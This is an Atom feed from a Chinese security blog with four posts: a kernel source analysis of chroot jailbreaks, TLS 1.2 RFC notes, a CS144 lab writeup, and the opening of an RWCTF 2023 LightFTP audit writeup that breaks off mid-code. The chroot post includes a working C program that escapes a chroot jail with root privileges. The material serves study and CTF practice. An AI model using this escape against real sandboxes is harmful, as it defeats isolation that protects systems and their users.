<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木头的小木屋</title>
  
  <subtitle>吃饱混天黑？</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="wood1314.github.io/"/>
  <updated>2023-04-25T03:16:48.552Z</updated>
  <id>wood1314.github.io/</id>
  
  <author>
    <name>Wood</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>chroot jailbreak 源码分析</title>
    <link href="wood1314.github.io/year/04/25/clgvp4kob0000c53fqq5nrxss/"/>
    <id>wood1314.github.io/year/04/25/clgvp4kob0000c53fqq5nrxss/</id>
    <published>2023-04-25T03:14:43.000Z</published>
    <updated>2023-04-25T03:16:48.552Z</updated>
    
    <content type="html"><![CDATA[<p>chroot主要的功能是改变根目录，之前是在ctf出题时会将/home/ctf目录chroot成为根目录，实现与我们docker的文件系统隔离，提供一个安全的靶场环境。在模拟运行固件的时候，也经常会将当前文件系统的目录chroot为根目录，这样才能找到固件所需库的路径。</p><p>然而这个东西并不安全，常用的工具<a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener">chr00t</a> </p><a id="more"></a><h2 id="chroot-jailbreak条件"><a href="#chroot-jailbreak条件" class="headerlink" title="chroot jailbreak条件"></a>chroot jailbreak条件</h2><ol><li>root权限</li><li>可以进行open,chdir,chroot,mkdir等系统调用</li></ol><p>满足以上条件就可以达到chroot jailbreak</p><h2 id="cwd-与-root"><a href="#cwd-与-root" class="headerlink" title="cwd 与 root"></a>cwd 与 root</h2><p>对于我们当前的path路径，一般proc采用了两个成员来表示</p><ul><li>cwd 当前目录，也就是我们目前位于的工作目录</li><li>root 根目录<br>一般情况下我们cwd的当前目录是不允许访问root意外的路径的。</li></ul><h2 id="chroot-jailbreak-原理分析"><a href="#chroot-jailbreak-原理分析" class="headerlink" title="chroot jailbreak 原理分析"></a>chroot jailbreak 原理分析</h2><p>了解了以上两个概念我们就可以深入理解chroot jailbreak的原理了</p><h3 id="ksys-chroot"><a href="#ksys-chroot" class="headerlink" title="ksys_chroot"></a>ksys_chroot</h3><p>chroot功能实现的核心在set_fs_root，主要是将当前进程的的<code>root</code>设置为了传入的参数<code>path</code>。并且通过源码分析得知，chroot只改变了root但是并没有改变cwd。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ksys_chroot</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">path</span>;</span>  </span><br><span class="line"><span class="keyword">int</span> error;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;  </span><br><span class="line">retry:  </span><br><span class="line">    <span class="comment">// 根据文件名找到 path 结构  </span></span><br><span class="line">error = user_path_at(AT_FDCWD, filename, lookup_flags, &amp;path);  </span><br><span class="line"><span class="keyword">if</span> (error)  </span><br><span class="line"><span class="keyword">goto</span> out;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 解析 path 的 mm_root dentry 结构，再解析相应的 inode 结构，即 d_inode，就可找到挂载点相应的 inode 结构  </span></span><br><span class="line">error = inode_permission(path.dentry-&gt;d_inode, MAY_EXEC | MAY_CHDIR);  </span><br><span class="line"><span class="keyword">if</span> (error)  </span><br><span class="line"><span class="keyword">goto</span> dput_and_out;  </span><br><span class="line">  </span><br><span class="line">error = -EPERM;  </span><br><span class="line">    <span class="comment">// 判断当前进程所有者是不是有执行 chroot 操作的权限  </span></span><br><span class="line">    <span class="comment">// 这里是 namespace, cred 的内容了，不展开  </span></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(current_user_ns(), CAP_SYS_CHROOT))  </span><br><span class="line"><span class="keyword">goto</span> dput_and_out;  </span><br><span class="line">error = security_path_chroot(&amp;path);  </span><br><span class="line"><span class="keyword">if</span> (error)  </span><br><span class="line"><span class="keyword">goto</span> dput_and_out;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 主要操作就是这个函数  </span></span><br><span class="line">set_fs_root(current-&gt;fs, &amp;path);  </span><br><span class="line">error = <span class="number">0</span>;  </span><br><span class="line">dput_and_out:  </span><br><span class="line">path_put(&amp;path);  </span><br><span class="line"><span class="keyword">if</span> (retry_estale(error, lookup_flags)) &#123;  </span><br><span class="line">lookup_flags |= LOOKUP_REVAL;  </span><br><span class="line"><span class="keyword">goto</span> retry;  </span><br><span class="line">&#125;  </span><br><span class="line">out:  </span><br><span class="line"><span class="keyword">return</span> error;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="set-fs-root"><a href="#set-fs-root" class="headerlink" title="set_fs_root"></a>set_fs_root</h2><p><code>set_fs_root</code>是通过改变<code>fs-&gt;root</code>实现了改变当前进程文件系统<code>root</code>的功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Replace the fs-&gt;&#123;rootmnt,root&#125; with &#123;mnt,dentry&#125;. Put the old values.  </span></span><br><span class="line"><span class="comment"> * It can block.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_fs_root</span><span class="params">(struct fs_struct *fs, <span class="keyword">const</span> struct path *path)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">old_root</span>;</span>  </span><br><span class="line">  </span><br><span class="line">path_get(path);  </span><br><span class="line">spin_lock(&amp;fs-&gt;lock); <span class="comment">// 自旋锁  </span></span><br><span class="line">write_seqcount_begin(&amp;fs-&gt;seq);  </span><br><span class="line">old_root = fs-&gt;root; <span class="comment">// 保存程序的 根目录 的目录项  </span></span><br><span class="line">fs-&gt;root = *path; <span class="comment">// 设置 根目录 为 path 的目录项  </span></span><br><span class="line">write_seqcount_end(&amp;fs-&gt;seq);  </span><br><span class="line">spin_unlock(&amp;fs-&gt;lock);  </span><br><span class="line"><span class="keyword">if</span> (old_root.dentry)  </span><br><span class="line">path_put(&amp;old_root);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在设置了root后，一般情况下我们访问当前文件系统下的文件有两种方式。</p><ol><li>绝对路径。如果采用绝对路径就会默认从我们刚设置的根目录开始寻找，这种方法是没办法访问根之外的文件的</li><li>相对路径。以当前cwd为开始目录，去寻找我们要访问的文件。</li></ol><p>看起来好像都没什么问题，那么如果我们 <code>cd ..</code>呢，向上寻找的时候内核是怎么判断让他不逃出root的呢，</p><h3 id="follow-dotdot-rcu"><a href="#follow-dotdot-rcu" class="headerlink" title="follow_dotdot_rcu"></a>follow_dotdot_rcu</h3><p>看一下主要处理<code>cd ..</code>的处理逻辑，发现核心处理逻辑就是判断当前path是否和root相等，如果相等就不能继续向上找，如果不相等那就无所谓，可以继续向上找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">follow_dotdot_rcu</span><span class="params">(struct nameidata *nd)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">parent</span>, *<span class="title">old</span>;</span>  </span><br><span class="line"><span class="keyword">if</span> (path_equal(&amp;nd-&gt;path, &amp;nd-&gt;root)) <span class="comment">//在这里判断当前path是否和root相等</span></span><br><span class="line"><span class="keyword">goto</span> in_root;</span><br><span class="line">     .</span><br><span class="line">     .</span><br><span class="line">     .</span><br><span class="line"></span><br><span class="line">in_root:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (read_seqretry(&amp;mount_lock, nd-&gt;m_seq))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ECHILD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(nd-&gt;flags &amp; LOOKUP_BENEATH))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ECHILD);</span><br><span class="line"></span><br><span class="line">nd-&gt;next_seq = nd-&gt;seq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nd-&gt;path.dentry;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么按照这个逻辑，只要我们当前的cwd不处于root之下，就可以一直<code>cd..</code> 最终逃出<code>chroot</code>。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"."</span>, O_RDONLY), i; <span class="comment">// jail外的文件描述符，供之后脱离  </span></span><br><span class="line">  mkdir(<span class="string">"tempdir"</span>, <span class="number">0755</span>);  </span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"tempdir"</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// chroot  </span></span><br><span class="line">  <span class="keyword">if</span> (fchdir(fd) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 脱离  </span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) <span class="comment">// 回到原先的root目录。这里不能使用绝对路径`/`，只能逐步上移  </span></span><br><span class="line">      chdir(<span class="string">".."</span>);  </span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"."</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 若是特权进程，则可进一步，把root设回去；不是的话也足以访问jail外的文件  </span></span><br><span class="line">  system(<span class="string">"ls"</span>);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;chroot主要的功能是改变根目录，之前是在ctf出题时会将/home/ctf目录chroot成为根目录，实现与我们docker的文件系统隔离，提供一个安全的靶场环境。在模拟运行固件的时候，也经常会将当前文件系统的目录chroot为根目录，这样才能找到固件所需库的路径。&lt;/p&gt;
&lt;p&gt;然而这个东西并不安全，常用的工具&lt;a href=&quot;https://github.com/earthquake/chw00t&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;chr00t&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
    
      <category term="chroot" scheme="wood1314.github.io/tags/chroot/"/>
    
      <category term="逃逸" scheme="wood1314.github.io/tags/%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>TSL1.2 RFC阅读</title>
    <link href="wood1314.github.io/year/04/12/clgvp3n5k001r6n3fn056smhg/"/>
    <id>wood1314.github.io/year/04/12/clgvp3n5k001r6n3fn056smhg/</id>
    <published>2023-04-12T14:57:44.000Z</published>
    <updated>2023-04-12T15:23:09.615Z</updated>
    
    <content type="html"><![CDATA[<p>这阵子在看加密协议，因此读了一下TLS1.2的RFC了解一下。主要重点是关注一些可能出现内存洞的地方，思考下后面该怎么进行fuzz。</p><a id="more"></a><h2 id="TLS协议简介"><a href="#TLS协议简介" class="headerlink" title="TLS协议简介"></a>TLS协议简介</h2><p>SSL全称是Secure Sockets Layer，安全套接字层。其实感性点来讲，在我印象里就是https协议中，用来加密http协议内容的东西。毕竟http请求都是明文的，如果你的请求里包含一些敏感信息像身份证号，银行的账号密码什么的。你的这些信息就很容易被劫持和泄漏。</p><p>比如我在我合租房间的路由器上，放一个劫持流量的程序。假如我的舍友们都用http协议来访问和登陆网站，那么我就可以劫持到他们的明文流量得知他们的账号和密码。如果他们的流量是用tls加密过的，比如https协议。那么即使我可以看到他们的流量我也无法得知他们访问的具体内容以及账号密码。</p><h2 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h2><p>HMAC是一种基于密钥的认证码算法，全称是Hash-based Message Authentication Code，是一种更安全的信息摘要算法。HMAC的作用是通过一个共享的密钥和一个哈希加密函数，来对数据进行完整性和身份验证。它可以与任何哈希函数配合使用。</p><p><img src="https://img.halfrost.com/Blog/ArticleImage/103_2_.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这阵子在看加密协议，因此读了一下TLS1.2的RFC了解一下。主要重点是关注一些可能出现内存洞的地方，思考下后面该怎么进行fuzz。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络协议" scheme="wood1314.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>CS144 lab0 warmup</title>
    <link href="wood1314.github.io/year/01/23/clgvp3n4f000d6n3fkhsj7u76/"/>
    <id>wood1314.github.io/year/01/23/clgvp3n4f000d6n3fkhsj7u76/</id>
    <published>2023-01-23T12:25:17.000Z</published>
    <updated>2023-01-23T12:28:33.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-在一切之前"><a href="#0x00-在一切之前" class="headerlink" title="0x00 在一切之前"></a>0x00 在一切之前</h2><p>这章主要是实现一个wget熟悉一下http报文构造，还有就是根据给出的api，创建一个管道。这个管道具有一定的极限大小，可以在输入端写入，在输出端读出，输入端可以停止写入并阻止接下来的写入操作。当读入端读到末尾的时候，他会遇到eof，当遇到eof时就不能继续读入任何内容。虽然管道有其本身的极限大小，但是如果同时读入读出是相当于它可以传输无穷多的字符。</p><p>源码位于我的仓库<a href="https://github.com/Wood1314/CS144" target="_blank" rel="noopener">https://github.com/Wood1314/CS144</a></p><a id="more"></a><h2 id="0x01-webget"><a href="#0x01-webget" class="headerlink" title="0x01 webget"></a>0x01 webget</h2><h3 id="1-1-实现要求"><a href="#1-1-实现要求" class="headerlink" title="1.1 实现要求"></a>1.1 实现要求</h3><p>使用HTTP的GET方法访问指定的url，并且将response全部输出。</p><h3 id="1-2-具体实现"><a href="#1-2-具体实现" class="headerlink" title="1.2 具体实现"></a>1.2 具体实现</h3><p>主要就是看代码熟悉一下实验里提供的TCPSocket类还有Address类等，然后利用connetct连接后，用write和read方法发送和接收报文即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_URL</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;host, <span class="keyword">const</span> <span class="built_in">string</span> &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// You will need to connect to the "http" service on</span></span><br><span class="line">    <span class="comment">// the computer whose name is in the "host" string,</span></span><br><span class="line">    <span class="comment">// then request the URL path given in the "path" string.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Then you'll need to print out everything the server sends back,</span></span><br><span class="line">    <span class="comment">// (not just one call to read() -- everything) until you reach</span></span><br><span class="line">    <span class="comment">// the "eof" (end of file).</span></span><br><span class="line">    <span class="built_in">string</span> payload;</span><br><span class="line">    <span class="built_in">string</span> rsp;</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"GET "</span> + path + <span class="string">" HTTP/1.1\r\n"</span>;</span><br><span class="line">    payload += <span class="string">"Host: "</span> + host + <span class="string">"\r\n"</span>;</span><br><span class="line">    payload += <span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt; <span class="string">"Function called: get_URL("</span> &lt;&lt; host &lt;&lt; <span class="string">", "</span> &lt;&lt; path &lt;&lt; <span class="string">").\n"</span>;</span><br><span class="line">    TCPSocket fd;</span><br><span class="line">    fd.connect(Address(host, <span class="string">"http"</span>));</span><br><span class="line">    fd.write(payload);</span><br><span class="line">    <span class="keyword">while</span> (!fd.eof()) &#123;</span><br><span class="line">        fd.read(rsp);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rsp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚开始写的时候犯了如下错误</p><ol><li>GET没有全部大写</li><li>输入结束时候应该再加一个<code>\r\n</code> 而我加了一个<code>\n</code>，最后导致返回包一直是400。</li></ol><h2 id="0x02-实现一个内存中的字节流"><a href="#0x02-实现一个内存中的字节流" class="headerlink" title="0x02 实现一个内存中的字节流"></a>0x02 实现一个内存中的字节流</h2><h3 id="2-1-实验要求"><a href="#2-1-实验要求" class="headerlink" title="2.1 实验要求"></a>2.1 实验要求</h3><p>这个部分实验给出了想实现的效果，以及api接口还有检测正确性的harness。在快写完不断报错的时候才发现自己误解了题意，真尴尬啊。写代码之前还是要把思路理清楚。简而言之要求和需要注意的点如下。</p><ol><li>这个字节流具有一个最大的大小，称为<code>capacity</code>。当前字节流中的数据不能超过<code>capacity</code>的大小。一次性输入超过<code>capacity</code>大小的字符话，超过该大小的字符会被舍。</li><li>字节流抽象的来说具有读入和输出两个口，当读入达到<code>capacity</code>时便不能再读入，当字节流为空时就不能输出。</li><li>当输入端关闭之后，也就是执行了<code>endInput</code>函数后。字节流为空后字节流就会置为EOF，因为此时输入端已经不可能再输入字符，此时到达结尾就意味着字符流不可能再输出任何字符了。</li></ol><h2 id="2-2-自己犯的错误"><a href="#2-2-自己犯的错误" class="headerlink" title="2.2 自己犯的错误"></a>2.2 自己犯的错误</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::write</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> dataSize = data.size();</span><br><span class="line">    <span class="keyword">size_t</span> writenSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">this</span>-&gt;streamflow.size() +writenSize &lt; <span class="keyword">this</span>-&gt;streamCapacity &amp;&amp; writenSize &lt; dataSize) &#123;    <span class="comment">// [1] </span></span><br><span class="line">        <span class="keyword">this</span>-&gt;streamflow.push_back(data[writenSize]);</span><br><span class="line">        writenSize++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>-&gt;bytesWriten += writenSize;</span><br><span class="line">    <span class="keyword">return</span> writenSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在[1]处错误的用<code>this-&gt;streamflow.size() +writenSize</code>这两个值相加与字符流的最大容量相比。导致实际读入的最大长度变小了。我本意是想用<code>原本字符流的大小与已经读入的大小相加</code> 但实际上多此一举，直接用当前size和最大容量相比就可以了。</p><p>遇到的另一个问题是对于eof的理解不到位，因此看着测试用例的报错乱改。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-在一切之前&quot;&gt;&lt;a href=&quot;#0x00-在一切之前&quot; class=&quot;headerlink&quot; title=&quot;0x00 在一切之前&quot;&gt;&lt;/a&gt;0x00 在一切之前&lt;/h2&gt;&lt;p&gt;这章主要是实现一个wget熟悉一下http报文构造，还有就是根据给出的api，创建一个管道。这个管道具有一定的极限大小，可以在输入端写入，在输出端读出，输入端可以停止写入并阻止接下来的写入操作。当读入端读到末尾的时候，他会遇到eof，当遇到eof时就不能继续读入任何内容。虽然管道有其本身的极限大小，但是如果同时读入读出是相当于它可以传输无穷多的字符。&lt;/p&gt;
&lt;p&gt;源码位于我的仓库&lt;a href=&quot;https://github.com/Wood1314/CS144&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/Wood1314/CS144&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="程序员的自我修养" scheme="wood1314.github.io/categories/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    
    
      <category term="计算机网络" scheme="wood1314.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF 2023 NonHeavyFTP writeup</title>
    <link href="wood1314.github.io/year/01/11/clgvp3n5b00166n3fzjr9y18b/"/>
    <id>wood1314.github.io/year/01/11/clgvp3n5b00166n3fzjr9y18b/</id>
    <published>2023-01-11T03:07:39.000Z</published>
    <updated>2023-01-11T05:26:44.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-在一切之前"><a href="#0x00-在一切之前" class="headerlink" title="0x00 在一切之前"></a>0x00 在一切之前</h2><p>审计lightftp代码中出现0day漏洞。</p><a id="more"></a><h2 id="0x01-描述"><a href="#0x01-描述" class="headerlink" title="0x01 描述"></a>0x01 描述</h2><p>附件解压后文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">Dockerfile fftp       fftp.conf</span><br></pre></td></tr></table></figure><p>查看dockerfile可知我们的目标是最新版本的ligthftp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2</span><br></pre></td></tr></table></figure><p>配置文件如下，使用anonymous加任意密码就可以登录，不过只有只读权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ftpconfig]</span><br><span class="line">port=2121</span><br><span class="line">maxusers=10000000</span><br><span class="line">interface=0.0.0.0</span><br><span class="line">local_mask=255.255.255.255</span><br><span class="line"></span><br><span class="line">minport=30000</span><br><span class="line">maxport=60000</span><br><span class="line"></span><br><span class="line">goodbyemsg=Goodbye!</span><br><span class="line">keepalive=1</span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">pswd=*</span><br><span class="line">accs=readonly</span><br><span class="line">root=/server/data/</span><br></pre></td></tr></table></figure><h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p>从main.c当中的main函数开始看起。程序解析config文件后会进入<code>ftp_main</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Program entry point */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//解析config文件</span></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">cfg = config_init(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cfg = config_init(CONFIG_FILE_NAME);</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line"><span class="keyword">while</span> (cfg != <span class="literal">NULL</span>)&#123;</span><br><span class="line">···</span><br><span class="line"><span class="comment">//主逻辑在ftpmain</span></span><br><span class="line"><span class="keyword">if</span> (pthread_create(&amp;thid, <span class="literal">NULL</span>, &amp;ftpmain, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error: Failed to create main server thread\r\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ftp_main函数中监听端口，accept后进入协议处理逻辑，<code>ftp_client_thread</code>逻辑中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">ftpmain</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ···</span><br><span class="line">   clientsocket = accept(ftpsocket, (struct sockaddr *)&amp;laddr, &amp;asz);</span><br><span class="line">  ···</span><br><span class="line"> rv = pthread_create(&amp;th, <span class="literal">NULL</span>, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))ftp_client_thread, &amp;scb[i]);</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>ftp_client_thread</code>中，读入ftp的命令并解析，随后调用对应的<code>Command</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 